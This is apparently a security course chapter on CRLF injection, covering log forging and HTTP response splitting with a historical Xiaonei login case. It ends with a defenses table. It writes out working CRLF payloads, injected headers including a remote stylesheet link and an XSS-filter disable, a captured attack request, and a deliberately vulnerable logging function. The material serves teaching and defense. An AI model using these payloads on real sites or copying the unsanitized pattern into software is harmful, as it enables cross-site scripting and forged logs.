# 44 - CRLF Injection and HTTP Header Injection

## CRLF Injection — Log Injection

### What Is CRLF?

`CR` = Carriage Return (`\r`, `0x0d`) and `LF` = Line Feed (`\n`, `0x0a`). Together `\r\n` (CRLF) is the line separator in HTTP headers and many log formats. On Unix, `\n` alone is the line separator.

### Log Injection Example

```python
def log_failed_login(username):
    log = open("access.log", 'a')
    log.write("User login failed for: %s\n" % username)
    log.close()
```

**Normal log entries:**

```
User login failed for: guest
User login failed for: admin
```

**Malicious username:**

```
guest\nUser login succeeded for: admin
```

**Resulting log file:**

```
User login failed for: guest
User login succeeded for: admin
```

The `\n` in the username creates a new log line. A security analyst reading the logs sees a legitimate "login succeeded" entry for admin — the attacker has **forged a log entry** to cover their tracks or frame another user.

**Impacts of log injection:**
- Forge log entries to hide attacks
- Inject false evidence
- Corrupt log parsing tools (SIEM, analytics)
- If logs are displayed in a web admin panel: XSS via log injection

## HTTP Header Injection (HTTP Response Splitting)

### The Vulnerability

When user input is reflected in an HTTP response header without sanitizing CRLF characters, the attacker can inject new headers or even a full response body.

### Real-World Case: Xiaonei (Renren) Login

**The attack form:**

```html
<form id="x"
  action="http://login.xiaonei.com/Login.do?email=a%0d%0a%0d%0a<script>alert(/XSS/);</script>"
  method="post">
    <input name="password" value="testtest" />
    <input name="origURL" value="http%3A%2F%2Fwww.xiaonei.com%2FSysHome.do%0d%0a" />
    <input name="formName" value="" />
    <input name="method" value="" />
    <input type="submit" value="登录" />
</form>
```

The `email` parameter contains `%0d%0a%0d%0a` (CRLF CRLF) followed by a `<script>` tag.

### What Happened in the Response

The server reflected the `email` input into a `Set-Cookie` header:

```
HTTP/1.1 200 OK
Server: Resin/3.0.21
Set-Cookie: _de=a

<script>alert(/XSS/);</script>; domain=.xiaonei.com; expires=Thu, 10-Dec-2009 13:35:17 GMT
Content-Type: text/html; charset=UTF-8
```

**Breaking it down:**

```
Set-Cookie: _de=a          ← normal header, value from email param
                            ← CRLF (%0d%0a) — end of header line
                            ← CRLF (%0d%0a) — blank line = END OF HEADERS
<script>alert(/XSS/);</script>; domain=...
↑ Browser interprets this as the RESPONSE BODY
```

The double CRLF (`%0d%0a%0d%0a`) signals the end of HTTP headers. Everything after it becomes the response body. The browser renders the injected `<script>` tag and executes JavaScript.

### HTTP Response Structure (Why CRLF Matters)

```
HTTP/1.1 200 OK\r\n                    ← status line
Content-Type: text/html\r\n            ← header
Set-Cookie: session=abc\r\n            ← header
\r\n                                   ← BLANK LINE = end of headers
<html>...</html>                       ← body starts here
```

The blank line (double CRLF) is the **only boundary** between headers and body. If the attacker can inject `\r\n\r\n`, they control where the body begins.

### What the Attacker Can Inject

**New headers:**

```
%0d%0aLink: <http://www.a.com/xss.css>; REL:stylesheet
```

This injects a `Link` header that loads an external stylesheet — potential for CSS-based data exfiltration.

**Disable XSS protection:**

```
%0d%0aX-XSS-Protection: 0
```

Injects a header that disables the browser's built-in XSS filter, making other XSS attacks easier.

**Full response body (response splitting):**

```
%0d%0a%0d%0a<html><script>alert(document.cookie)</script></html>
```

Injects a complete HTML page as the response body.

### The Full Attack Chain

```
User input with CRLF
  → Server reflects input in HTTP header (Set-Cookie, Location, etc.)
    → %0d%0a ends the current header
      → %0d%0a%0d%0a ends ALL headers (blank line)
        → Everything after becomes response body
          → Browser renders attacker's HTML/JS
            → XSS achieved via HTTP headers
```

### HTTP Request from the Xiaonei Attack

```
POST http://login.xiaonei.com/Login.do?email=a%0d%0a%0d%0a<script>alert(/XSS/);</script>
Host: login.xiaonei.com
Cookie: XNESSESSIONID=abcThVKoGZNy6aSjWV54r; userid=246859805; ...
Content-Type: application/x-www-form-urlencoded

password=testtest&origURL=http%253A%252F%252Fwww.xiaonei.com%252FSysHome.do%250d%250a&...
```

The `email` parameter in the URL carries the CRLF payload. The server processes it and places the value into the `Set-Cookie` header without stripping `\r\n`, splitting the response.

## Defenses

| Defense | How |
|---------|-----|
| **Strip CR and LF from user input** | Remove `\r` (`0x0d`) and `\n` (`0x0a`) before using input in headers |
| **URL-encode header values** | Encode all non-alphanumeric characters when reflecting input in headers |
| **Use framework header APIs** | Modern frameworks (Spring, Express, Django) automatically reject CRLF in header values |
| **Never reflect raw input in headers** | Treat `Set-Cookie`, `Location`, `Link`, and all headers as security-sensitive outputs |
| **WAF rules for %0d%0a** | Block requests containing CRLF sequences in parameters |
